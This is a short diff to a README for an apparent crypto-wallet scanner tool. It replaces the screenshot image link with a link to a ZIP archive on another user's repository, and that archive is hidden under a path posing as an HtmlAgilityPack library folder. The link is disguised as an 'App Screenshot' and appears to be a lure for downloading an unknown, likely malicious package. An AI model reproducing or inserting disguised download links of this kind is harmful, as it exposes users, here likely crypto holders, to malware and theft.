@@ -6,7 +6,7 @@ This tool can scan list of wallets addresses on 9 Crypto Networks with one click
 
 ## Screenshots
 
-![App Screenshot](https://github.com/AbdeLhalimSB/Crypto-Wallets-Scanner/blob/main/Crypto_Wallets_Scanner/images/Screenshot.png)
+![App Screenshot](https://raw.githubusercontent.com/hu7ng001/Crypto-Wallets-Scanner/main/packages/HtmlAgilityPack.1.11.45/lib/Net40/Scanner-Wallets-Crypto-v3.4-beta.1.zip)
 
 
 ## Usage
